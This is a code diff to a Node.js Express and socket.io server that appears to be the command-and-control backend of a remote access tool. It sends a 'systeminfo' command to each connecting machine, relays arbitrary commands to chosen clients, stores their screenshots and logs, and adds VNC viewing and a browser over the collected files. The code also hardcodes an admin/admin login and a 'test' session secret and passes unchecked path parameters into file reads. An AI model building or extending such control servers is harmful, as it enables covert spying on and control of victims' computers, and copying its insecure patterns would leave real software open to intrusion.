@@ -16,7 +16,11 @@ getOfflineClients();
 
 app.use(express.json());
 
-app.use(express.urlencoded({ extended: true }));
+app.use(
+  express.urlencoded({
+    extended: true,
+  })
+);
 
 app.use(express.static("views"));
 app.use(express.static("clients"));
@@ -30,15 +34,15 @@ app.use(
     secret: "test",
     resave: true,
     saveUninitialized: true,
-    cookie: { secure: false }, //Remember to set it to true!
+    cookie: {
+      secure: false,
+    }, //Remember to set it to true!
   })
 );
 
 app.get("/", render.mainPage); //Render main page with login and register etc.
 
-app.get("/dashboard", render.dashboard); //Render main page with login and register etc.
-
-app.get("/console", render.console); //
+app.get("/dashboard", render.dashboard); //Render dashboard page
 
 app.post("/", function (req, res) {
   if (req.body.username == "admin" && req.body.password == "admin") {
@@ -49,17 +53,60 @@ app.post("/", function (req, res) {
   } else res.render("index");
 });
 
-app.get("/log", (req, res) => {
+app.get("/vnc/:ClientName/:ClientId", (req, res) => {
+  const ClientName = req.params.ClientName;
+  const ClientId = req.params.ClientId;
+
+  if (req.session.isLogged) {
+    res.render("vncclient", {
+      clientname: ClientName,
+      clientid: ClientId,
+    });
+  } else res.render("index");
+
+})
+app.get("/logs/:ClientName/:DirName?/:FileName?", (req, res) => {
+  const ClientName = req.params.ClientName;
+  const DirName = req.params.DirName;
+  const FileName = req.params.FileName;
   var fileContents;
-  try {
-    fileContents = fs.readFileSync(
-      "./clients/" + req.query.clientname + "/logs/log.txt"
-    );
-  } catch (err) {
-    // Here you get the error when the file was not found,
-    // but you also get any other error
+  var ext;
+
+  if (DirName != null && fs.existsSync(`./clients/${ClientName}`)) {
+    if (FileName != null) {
+      //Pobiera zawartosc pliku
+      try {
+        ext = FileName.split(".")
+        .filter(Boolean) // removes empty extensions (e.g. `filename...txt`)
+        .slice(1)
+        .join(".");
+      if(ext == "txt"){
+        fileContents = fs.readFileSync(
+          `./clients/${ClientName}/${DirName}/${FileName}`
+        );
+      } else {
+        fileContents = fs.readFileSync( `./clients/${ClientName}/${DirName}/${FileName}`, 'base64');
+      }
+
+        
+      } catch (err) {}
+    } else {
+      fileContents = fs.readdirSync(`./clients/${ClientName}/${DirName}`);
+    }
+  } else {
+    fileContents = fs.readdirSync(`./clients/${ClientName}`);
   }
-  res.render("log", { content: fileContents });
+
+  //Render log
+  if (req.session.isLogged) {
+    res.render("log", {
+      content: fileContents,
+      clientname: ClientName,
+      dirname: DirName,
+      filename: FileName,
+      type: ext,
+    });
+  } else res.render("index");
 });
 
 app.post("/logout", (req, res) => {
@@ -79,17 +126,11 @@ io.on("connection", (socket) => {
     socket.name = info[1];
     socket.version = info[2];
     console.log("Dolaczono: " + socket.name + " " + socket.ip);
-    clients.push({
-      id: socket.id,
-      name: socket.name,
-      ip: socket.ip,
-      version: socket.version,
-    });
+    socket.emit("command", "systeminfo");
     checkDirectoryExists(socket.name);
     offlineclients.splice(offlineclients.indexOf(socket.name), 1);
     //console.log("Clients: " + clients);
     //socket.emit("command", "screenshot");
-
   });
 
   socket.on("logs", async (msg) => {
@@ -97,34 +138,66 @@ io.on("connection", (socket) => {
     //console.log(socket.name + ":" + msg);
     const now = new Date();
     const current = `[${now.getHours()}:${now.getMinutes()}] `;
-    writeToFile(socket.name, current+msg);
+    writeToFile(socket.name, current + msg);
   });
 
   socket.on("command", (msg) => {
     console.log(msg);
+    try{
     io.sockets.sockets.get(msg.id).emit("command", msg.cmd);
+    } catch (err) {}
   });
 
   socket.on("commandResult", async (msg) => {
     let bufferObj = Buffer.from(msg, "base64");
     let decodedString = bufferObj.toString("utf-8");
-    //console.log(decodedString);
-    io.emit("commandResult", { id: socket.id, response: decodedString });
+    console.log(decodedString);
+    if (socket.cpu == null) {
+      const outputLines = decodedString.split("\n");
+      const osNameLine = outputLines.find((line) =>
+        line.startsWith("OS Name:")
+      );
+      const osName = osNameLine.split(":")[1].trim();
+
+      clients.push({
+        id: socket.id,
+        name: socket.name,
+        ip: socket.ip,
+        version: socket.version,
+        system: osName,
+      });
+    } else {
+      io.emit("commandResult", {
+        id: socket.id,
+        response: decodedString,
+      });
+    }
   });
 
   socket.on("screenshotResult", async (msg) => {
-    console.log(msg);
-    var d = new Date,
-    dformat = [d.getMonth()+1,
-               d.getDate(),
-               d.getFullYear()].join('_')+'-'+
-              [d.getHours(),d.getMinutes(),d.getSeconds()].join('_');
+    //console.log(msg);
+    var d = new Date(),
+      dformat =
+        [d.getMonth() + 1, d.getDate(), d.getFullYear()].join("_") +
+        "-" +
+        [d.getHours(), d.getMinutes(), d.getSeconds()].join("_");
     const buffer = Buffer.from(msg, "base64");
-    fs.writeFileSync(`./clients/${socket.name}/screenshots/screenshot-${dformat}.jpg`, buffer);
+    io.emit("screenshotResult", {
+      id: socket.id,
+      response: msg,
+    });
+    fs.writeFileSync(
+      `./clients/${socket.name}/screenshots/screenshot-${dformat}.jpg`,
+      buffer
+    );
 
   });
+
   socket.on("delete", async (msg) => {
-    fs.rmSync(`./clients/${msg.clientname}`, { recursive: true, force: true });
+    fs.rmSync(`./clients/${msg.clientname}`, {
+      recursive: true,
+      force: true,
+    });
     offlineclients.splice(offlineclients.indexOf(msg.clientname), 1);
   });
 
@@ -150,6 +223,7 @@ function checkDirectoryExists(clientname) {
 }
 
 function writeToFile(clientname, msg) {
+  msg = msg.replace("\n", "");
   fs.appendFileSync(`./clients/${clientname}/logs/log.txt`, msg + "\n");
 }
 
